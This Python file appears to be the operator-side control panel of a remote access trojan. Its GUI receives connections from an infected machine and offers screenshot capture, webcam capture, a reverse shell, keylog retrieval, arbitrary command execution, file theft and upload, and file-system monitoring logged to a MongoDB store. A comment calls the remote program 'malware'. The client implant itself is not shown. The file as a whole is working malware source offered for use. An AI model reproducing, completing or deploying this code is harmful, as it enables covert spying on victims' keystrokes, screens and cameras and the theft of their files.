import customtkinter
import tkinter
import os
import socket
from CTkMessagebox import CTkMessagebox
import time
import threading
import subprocess
import json
import sys
import writeintomongo  # writetomongo is created by me
from PyQt5.QtCore import Qt
from PyQt5.QtWidgets import QApplication, QWidget, QLabel, QVBoxLayout
from PyQt5.QtGui import QIcon, QPalette, QColor

# Creating server socket, to listen for incoming connections
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(('127.0.0.1', 8080))
server_socket.listen(10)

# Initializing the status of the functions 0 means not busy and 1 means busy
working_screenshot = [0]
working_capture_image = [0]
working_rev_shell = [0]
working_change_path = [0]
working_execute_command = [0]
working_download_file = [0]
working_upload_file = [0]
textbox = None

# Creating a window that would show that you are now listening for connections.

def listening_window():
    global _app
    _app = QApplication(sys.argv)
    window = QWidget()
    palette = QPalette()
    palette.setColor(QPalette.Window, QColor(53, 53, 53))
    palette.setColor(QPalette.WindowText, Qt.white)
    palette.setColor(QPalette.Base, QColor(25, 25, 25))
    palette.setColor(QPalette.AlternateBase, QColor(53, 53, 53))
    palette.setColor(QPalette.ToolTipBase, Qt.black)
    palette.setColor(QPalette.ToolTipText, Qt.white)
    palette.setColor(QPalette.Text, Qt.white)
    palette.setColor(QPalette.Button, QColor(53, 53, 53))
    palette.setColor(QPalette.ButtonText, Qt.white)
    palette.setColor(QPalette.BrightText, Qt.red)
    palette.setColor(QPalette.Link, QColor(42, 130, 218))
    palette.setColor(QPalette.Highlight, QColor(42, 130, 218))
    palette.setColor(QPalette.HighlightedText, Qt.black)
    _app.setPalette(palette)
    _label = QLabel('Listening for connection....\nThis window will close automatically when connected.')
    layout = QVBoxLayout()
    layout.addWidget(_label)
    window.setLayout(layout)
    icon = QIcon(r"C:\Users\vivek\OneDrive\Desktop\OIP.jpeg")
    window.setWindowIcon(icon)
    window.setWindowTitle('Running')
    window.resize(400, 100)

    window.setWindowFlag(Qt.WindowCloseButtonHint, False)
    window.setWindowFlag(Qt.WindowMaximizeButtonHint, False)
    window.show()
    _app.exec_()

# Starting the listening window on separate thread
thread = threading.Thread(target=listening_window)
thread.start()

# Accepting connections on the socket

client_socket, client_addr = server_socket.accept()
client_socket2, client_addr2 = server_socket.accept()
client_socket3, client_addr3 = server_socket.accept()
client_socket4, client_addr4 = server_socket.accept()
client_socket5, client_addr5 = server_socket.accept()
client_socket6, client_addr6 = server_socket.accept()
client_socket7, client_addr7 = server_socket.accept()
client_socket8, client_addr8 = server_socket.accept()
client_socket9, client_addr9 = server_socket.accept()
client_socket10, client_addr10 = server_socket.accept()
client_socket_main_connection, client_addr_main = server_socket.accept()
client_socket_main_connection.settimeout(15)
# Closing the listening window
_app.quit()

# This function constantly checks the connection by sending and receiving data constantly if connection fails,
# the entire program will shut down


def connection_check():
    while True:
        try:
            client_socket_main_connection.sendall(b'INTACT')
            client_socket_main_connection.recv(1024)
        except (TimeoutError, ConnectionAbortedError, ConnectionError, ConnectionRefusedError):
            CTkMessagebox(title="Link Broke", message="Connection to the client broken. Program will exit now.")
            time.sleep(5)
            os._exit(1)


thread_connection_check = threading.Thread(target=connection_check)
thread_connection_check.start()

# Reverseshell class


class Reverseshell:

    def __init__(self, socket_name, status):
        self.socket_name = socket_name
        self.status = status
        print("\n\n Additional commands available:- \n :download <file_name_in_directory> \n :upload <file_name (file "
              "must be present in the directory where this file is) \n :kill --> Use this to close the connection \n "
              "Timeout is 120 seconds, if you don't use the shell for 120 seconds it will stop, use command :kill and "
              "then again select reverse shell option")

    def download(self, file):
        self.socket_name.settimeout(5)
        cmd = file
        file = "".join(file.split(":download")).strip()
        if file.strip():
            file_to_down = file.split("/")[-1] if "/" in file else file.split("\\")[-1] if "\\" in file else file
            self.socket_name.sendall(cmd.encode())
            down = self.socket_name.recv(2048)
            self.socket_name.send(b"Gotcha")
            if down == b"true":
                print(f"[+] downloading [ {file_to_down} ]...")
                with open(file_to_down, 'wb') as file:
                    while True:
                        try:
                            data = self.socket_name.recv(8192)
                            file.write(data)
                        except TimeoutError:
                            self.socket_name.settimeout(None)
                            print("Download complete")
                            break

            else:
                print(down)
        else:
            print("usage:    :download <file_to_download>\n")

    def upload(self, cmd):
        file_to_up = "".join(cmd.split(":upload")).strip()
        if not file_to_up.strip():
            print("usage:    :upload <file_to_upload>\n")
        else:
            if not os.path.isfile(file_to_up):
                print("error: open:no such file: " + file_to_up + "\n")
            else:
                self.socket_name.sendall(cmd.encode())
                print(f"Uploading file {file_to_up}")
                with open(file_to_up, 'rb') as file:
                    while True:
                        data = file.read(8192)
                        if not data:
                            break
                        self.socket_name.sendall(data)

                print("Uploaded")

    def control(self):
        cmd = input("Enter command:- ")
        if ":upload" in cmd:
            self.upload(cmd)
            self.control()

        elif ":download" in cmd:
            self.download(cmd)
            self.control()

        elif cmd.lower() == "cls" or cmd == "clear":
            os.system("cls||clear")
            self.control()
        elif cmd == ":kill":
            self.socket_name.send(b":kill")
            self.status[0] = 0
            sys.exit()
        self.socket_name.sendall(cmd.encode())
        DATA = self.socket_name.recv(102400)
        print(DATA.decode())
        self.control()

    def start(self):
        self.control()

# Defining the function to start reverse shell

def start_listener(socket_name):
    global working_rev_shell
    working_rev_shell[0] = 1
    Listener = Reverseshell(socket_name, working_rev_shell)
    Listener.start()

# Defining the function that would be used when uploading files

def send_file(FILENAME, FILESIZE, socket_name, status):
    FILENAME2 = FILENAME.replace("_", "")
    send_file_window = customtkinter.CTkToplevel()
    send_file_window.configure(bg="#242424")
    send_file_window.geometry("400x200")
    send_file_window.resizable(False, False)
    send_file_window.title("Sending File")
    label = tkinter.Label(master=send_file_window, text=f"Sending {FILENAME}", bg="#242424", fg="white",
                          font=("Segoe", 12), background="#242424")
    label.pack()
    progressbar = customtkinter.CTkProgressBar(send_file_window, width=250)
    progressbar.pack()
    progressbar.set(0)
    SIZE = 8192
    socket_name.send(f'{FILENAME2}_{FILESIZE}'.encode())
    socket_name.recv(1024)
    initial = 0
    with open(FILENAME, 'rb') as file:
        while True:
            data = file.read(SIZE)
            initial += len(data)
            percent = int(initial) / FILESIZE
            progressbar.set(percent)
            label.configure(text=f"Uploading, {FILENAME}..... {round(percent * 100)}% ", bg="#242424", fg="white",
                            font=("Segoe", 12),
                            background="#242424")
            if not data:
                send_file_window.destroy()
                break
            socket_name.send(data)
    status[0] = 0
    CTkMessagebox(title="File Uploaded",
                  message=f"{FILENAME} uploaded. Please wait for 10 seconds before sending another file.")

# Defining function that would receive files


def receive_file(socket_name, status):
    def file_recv(FILENAME, socket_name):
        FILENAME = FILENAME.split("/")[-1] if "/" in FILENAME else FILENAME.split("\\")[-1] if "\\" in FILENAME else FILENAME

        initial = 0
        with open(FILENAME, 'wb') as file:
            while True:
                try:
                    data = socket_name.recv(SIZE)
                    initial += len(data)
                    file.write(data)
                    percent = int(initial) / FILESIZE
                    progressbar.set(percent)
                    label.configure(text=f"Receiving, {FILENAME}..... {round(percent * 100)}% ", bg="#242424",
                                    fg="white", font=("Segoe", 12),
                                    background="#242424")
                except TimeoutError:
                    label.configure(text="File Received")
                    time.sleep(1)
                    CTkMessagebox(title="Info", message=f"{FILENAME} received")
                    break

    receive_file_window = customtkinter.CTkToplevel()
    receive_file_window.configure(bg="#242424")
    receive_file_window.geometry("400x200")
    receive_file_window.resizable(False, False)
    receive_file_window.title("Receiving file")
    label = tkinter.Label(master=receive_file_window, text=f"Receiving Filename", bg="#242424", fg="white",
                          font=("Segoe", 12), background="#242424")
    label.pack()

    SIZE = 8192
    data = socket_name.recv(SIZE).decode().split("_")
    socket_name.send(b'DONE')
    socket_name.settimeout(5)
    FILENAME, FILESIZE = data[0], int(data[1])
    progressbar = customtkinter.CTkProgressBar(receive_file_window, width=250)
    progressbar.set(0)
    progressbar.pack(pady=20)
    label.configure(text=f"Receiving, {FILENAME}.....  ", bg="#242424", fg="white", font=("Segoe", 12),
                    background="#242424")
    file_recv(FILENAME, socket_name)
    receive_file_window.destroy()
    socket_name.settimeout(None)
    status[0] = 0

# Defining the recv_data to receive large amount of data


def recv_data(socket_name=client_socket):
    data_received = ''
    while True:
        data = socket_name.recv(1024).decode()
        if data == 'no_data_left':
            break
        data_received += data
        socket_name.send(b"DONE")
    return data_received

# Just in case you want to run a single command like shutdown command

def execute_command():
    dialog = customtkinter.CTkInputDialog(text="Enter Command", title="Command Please")
    thing = dialog.get_input()
    if thing:
        client_socket.send("execute_command".encode())
        client_socket6.send(f"{thing}".encode())
        response = recv_data(client_socket6)
        try:
            if len(response) == 0:
                response = "COMMAND EXECUTED SUCCESSFULLY."
            CTkMessagebox(title="Response", message=response)
        except AttributeError:
            pass
    else:
        CTkMessagebox(title="Operation Canceled", message="No command entered")

# Defining the function to receive the records and add them to the database


def monitor_results():
    global textbox
    Recorder = writeintomongo.Recorder()
    while True:
        try:
            changes = client_socket2.recv(41960).decode().split("\n")
            for data in changes:
                if "created" in data:
                    insert_label(data.strip() + '\n')
                    Recorder.created(data)
                    continue
                if "modified" in data:
                    insert_label(data.strip() + '\n')
                    Recorder.modified(data)
                    continue
                if "deleted" in data:
                    insert_label(data.strip() + '\n')
                    Recorder.deleted(data)
                    continue
                if "renamed" in data:
                    insert_label(data.strip() + '\n')
                    Recorder.renamed(data)
                    continue
        except:
            pass

# Defining the function to open the keylog file
def show_recorded_keylog():
    subprocess.Popen("keylog.txt", shell=True)

# Defining function to constantly update the keylog received

def update_key_logs_regular():
    try:
        keylog = client_socket5.recv(8192).decode()
        with open("keylog.txt", 'a') as file:
            file.write(keylog)
    except:
        pass

# Starting the function on a separate thread


thread5 = threading.Thread(target=update_key_logs_regular, daemon=True)
thread5.start()

# Defining the work of download file button
def download_file():
    if working_download_file[0] == 0:
        working_download_file[0] = 1

        def do_this():
            client_socket.send("download_file".encode())
            dialog = customtkinter.CTkInputDialog(title="File Name",
                                                  text=f"Enter file name (if it is in the same directory where malware is) \nOR\nEnter Full Path:- ")
            file_name = dialog.get_input()
            if file_name:
                client_socket7.send(f"{file_name}".encode())
                data = client_socket7.recv(2048)
                if data == b'File NOT found.':
                    working_download_file[0] = 0
                    CTkMessagebox(title="File NOT found", message=f"No such {file_name} file exists. ")
                else:
                    receive_file(client_socket7, working_download_file)

            else:
                client_socket7.send("abort".encode())
                working_download_file[0] = 0
                CTkMessagebox(title="Operation Canceled", message="No file name entered.")

        thread_download_file = threading.Thread(target=do_this, daemon=True)
        thread_download_file.start()
    else:
        CTkMessagebox(title="Error", message="Download in progress. Let it finish.")

# Defining the work of screenshot button

def screenshot():
    global working_screenshot
    if working_screenshot[0] == 0:
        working_screenshot[0] = 1
        client_socket.send(b'screenshot')
        thread3 = threading.Thread(target=receive_file, args=(client_socket3, working_screenshot), daemon=True)
        thread3.start()
    else:
        CTkMessagebox(title="Error", message="Socket Busy")

# Defining the work of capture_image button


def capture_image():
    global working_capture_image
    if working_capture_image[0] == 0:
        working_capture_image[0] = 1
        client_socket.send(b'capture_image')

        def cam_check():
            data = client_socket4.recv(2048)
            if data == b'No camera detected':
                CTkMessagebox(title="Error", message="No camera detected.")
            else:
                thread4 = threading.Thread(target=receive_file, args=(client_socket4, working_capture_image))
                thread4.start()

        thread_capture_image = threading.Thread(target=cam_check, daemon=True)
        thread_capture_image.start()
    else:
        CTkMessagebox(title="Error", message="Socket Busy")

# Defining the work of upload_file button

def upload_file():
    global working_upload_file
    if working_upload_file[0] == 0:
        working_upload_file[0] = 1
        folder = os.getcwd()
        only_files = ([f for f in os.listdir(folder) if os.path.isfile(os.path.join(folder, f))])
        files = ""
        for i in only_files:
            files += i + '\n'
        dialog = customtkinter.CTkInputDialog(text=f"{files} Above files can be uploaded, enter file name:- ",
                                              title="Enter File Name:- ")
        file_to_upload = dialog.get_input()
        if file_to_upload:
            if file_to_upload in files:
                client_socket.send("upload_file".encode())
                file_size = os.path.getsize(file_to_upload)
                thread_send_file = threading.Thread(target=send_file, args=(file_to_upload, file_size, client_socket8, working_upload_file))
                thread_send_file.start()

            else:
                working_upload_file[0] = 0
                CTkMessagebox(title="Wrong File Name", message="Please enter correct file name.")
        else:
            working_upload_file[0] = 0
            CTkMessagebox(title="Operation Canceled", message="No file name entered.")
    else:
        CTkMessagebox(title="Error", message="A file is being uploaded. Please Wait.")

# Defining the work of Reverseshell button

def reverse_shell():
    global working_rev_shell
    if working_rev_shell[0] == 0:
        client_socket.send(b'reverse_shell')
        CTkMessagebox(title="Info", message="Check command prompt.")
        thread_listener = threading.Thread(target=start_listener, args=(client_socket9,), daemon=True)
        thread_listener.start()
    else:
        CTkMessagebox(title="Error", message="Reverse shell already in use.")


results = ''

# This would constantly update the text_box with the new records

def insert_label(data):
    global text_box, results
    text_box.configure(state="normal")
    text_box.delete("0.0", "end")
    results += data
    text_box.insert("0.0", results)
    text_box.configure(state="disabled")

# Defining the work of change_path button

def change_path():
    global working_change_path
    if working_change_path[0] != 0:
        CTkMessagebox(title="Info", message="An instance is already running please use it.")
        return
    working_change_path[0] = 1
    change_path_window = customtkinter.CTkToplevel(app)
    change_path_window.title("Enter the paths to monitor")
    change_path_window.geometry("800x600")
    change_path_window.resizable(False, False)

    def confirm():
        global working_change_path
        client_socket.send("change_path".encode())
        path_1 = entry_1.get()
        path_2 = entry_2.get()
        path_3 = entry_3.get()
        path_4 = entry_4.get()
        paths = {'path1': path_1, 'path2': path_2, 'path3': path_3, 'path4': path_4}
        json_data = json.dumps(paths)
        client_socket10.sendall(json_data.encode())
        receive_response = json.loads(client_socket10.recv(40960).decode())
        working_change_path[0] = 0
        change_path_window.destroy()
        CTkMessagebox(title="Response from client", message=f"Observer1= {receive_response['path1']} \n"
                                                            f"Observer2 = {receive_response['path2']} \n"
                                                            f"Observer3 = {receive_response['path3']} \n"
                                                            f"Observer4 = {receive_response['path4']} ")

    def _close():
        global working_change_path
        working_change_path[0] = 0
        change_path_window.destroy()

    change_path_window.protocol("WM_DELETE_WINDOW", _close)
    label_1 = customtkinter.CTkLabel(change_path_window, text="Enter 1st path to monitor:-  ")
    label_1.place(relx=0.2, rely=0.1)
    entry_1 = customtkinter.CTkEntry(change_path_window)
    entry_1.place(relx=0.6, rely=0.1)
    label_2 = customtkinter.CTkLabel(change_path_window, text="Enter 2nd path to monitor:- ")
    label_2.place(relx=0.2, rely=0.3)
    entry_2 = customtkinter.CTkEntry(change_path_window)
    entry_2.place(relx=0.6, rely=0.3)
    label_3 = customtkinter.CTkLabel(change_path_window, text="Enter 3rd path to monitor:- ")
    label_3.place(relx=0.2, rely=0.5)
    entry_3 = customtkinter.CTkEntry(change_path_window)
    entry_3.place(relx=0.6, rely=0.5)
    label_4 = customtkinter.CTkLabel(change_path_window, text="Enter 4th path to monitor:- ")
    label_4.place(relx=0.2, rely=0.7)
    entry_4 = customtkinter.CTkEntry(change_path_window)
    entry_4.place(relx=0.6, rely=0.7)
    button = customtkinter.CTkButton(change_path_window, text="Confirm", command=confirm)
    button.place(relx=0.2, rely=0.9)
    button = customtkinter.CTkButton(change_path_window, text="Cancel", command=_close)
    button.place(relx=0.5, rely=0.9)

# Defining the work of close button


def close():
    client_socket.close()
    client_socket2.close()
    client_socket3.close()
    client_socket4.close()
    client_socket5.close()
    client_socket6.close()
    client_socket7.close()
    client_socket8.close()
    client_socket9.close()
    client_socket10.close()
    client_socket_main_connection.close()
    server_socket.close()
    os._exit(1)

# Defining the database function, it will create a separate window for looking for records in the database


def database():
    toplevel = customtkinter.CTkToplevel(app)
    toplevel.geometry("1024x768")
    toplevel.title("Search for Records")
    label_1 = customtkinter.CTkLabel(toplevel, text="Enter file name:-  ")
    label_1.place(relx=0.3, rely=0.05)
    entry_1 = customtkinter.CTkEntry(toplevel)
    entry_1.place(relx=0.6, rely=0.05)

    text = customtkinter.CTkTextbox(toplevel, width=600, height=500, bg_color="#2B2B2B", corner_radius=10)
    text.place(relx=0.3, rely=0.25)
    text.insert("0.0", "Records are shown here")
    text.configure(state="disabled")

    # Defining function for search button
    def search():

        result = ""
        filename = entry_1.get()
        searcher = writeintomongo.Recorder().search(filename)
        for i in searcher:
            if len(i) != 0:
                for j in i:
                    for k in j:
                        if k != "_id":
                            result += k + " : " + str(j[k])+"\n"
                    result += "\n"
        if len(result.strip()) == 0:
            result = "NOTHING FOUND"
        print(result)
        text.configure(state="normal")
        text.delete("0.0", "end")
        text.insert("0.0", result)
        text.configure(state="disabled")

    # Creating and placing the "Search" button

    button = customtkinter.CTkButton(toplevel, text="Search", command=search)
    button.place(relx=0.45, rely=0.15)


# Creating interface

app = customtkinter.CTk()
app.title("SERVER INTERFACE")
app.geometry("1280x720")

customtkinter.set_appearance_mode("dark")

text_box = customtkinter.CTkTextbox(app, width=600, height=500, bg_color="#2B2B2B", corner_radius=10)
text_box.place(relx=0.4, rely=0.05)
text_box.configure(state="disabled")

# Starting the monitor_results on a thread

thread1 = threading.Thread(target=monitor_results, daemon=True)
thread1.start()

# Creating buttons and placing them

screenshot_button = customtkinter.CTkButton(master=app, width=120, height=40, corner_radius=10, text="SCREENSHOT",
                                            command=screenshot)

screenshot_button.place(relx=0.2, rely=0.1, anchor=tkinter.CENTER)

capture_image_button = customtkinter.CTkButton(master=app, width=120, height=40, corner_radius=10,
                                               text="CAPTURE IMAGE", command=capture_image)
capture_image_button.place(relx=0.2, rely=0.2, anchor=tkinter.CENTER)

reverse_shell_button = customtkinter.CTkButton(master=app, width=120, height=40, corner_radius=10,
                                               text="REVERSE SHELL", command=reverse_shell)
reverse_shell_button.place(relx=0.2, rely=0.3, anchor=tkinter.CENTER)

keyloggers_button = customtkinter.CTkButton(master=app, width=120, height=40,
                                            corner_radius=10, text="SHOW RECORDED KEYLOG",
                                            command=show_recorded_keylog)
keyloggers_button.place(relx=0.2, rely=0.4, anchor=tkinter.CENTER)

change_path_button = customtkinter.CTkButton(master=app, width=120, height=40, corner_radius=10,
                                               text="CHANGE PATH", command=change_path)
change_path_button.place(relx=0.2, rely=0.5, anchor=tkinter.CENTER)

execute_command_button = customtkinter.CTkButton(master=app, width=120, height=40, corner_radius=10,
                                                 text="EXECUTE COMMAND", command=execute_command)
execute_command_button.place(relx=0.2, rely=0.6, anchor=tkinter.CENTER)

download_button = customtkinter.CTkButton(master=app, width=120, height=40, corner_radius=10, text="DOWNLOAD FILE",
                                          command=download_file)
download_button.place(relx=0.2, rely=0.7, anchor=tkinter.CENTER)

upload_button = customtkinter.CTkButton(master=app, width=120, height=40, corner_radius=10, text="UPLOAD FILE",
                                        command=upload_file)
upload_button.place(relx=0.2, rely=0.8, anchor=tkinter.CENTER)

exit_button = customtkinter.CTkButton(master=app, width=120, height=40, corner_radius=10, text="CLOSE", command=close)
exit_button.place(relx=0.2, rely=0.9, anchor=tkinter.CENTER)

search_database_button = customtkinter.CTkButton(master=app, width=120, height=40, corner_radius=10,
                                               text="SEARCH IN DATABASE", command=database)
search_database_button.place(relx=0.55, rely=0.85)

# Defining what close button will do

app.protocol("WM_DELETE_WINDOW", close)

# Starting the Interface

app.mainloop()
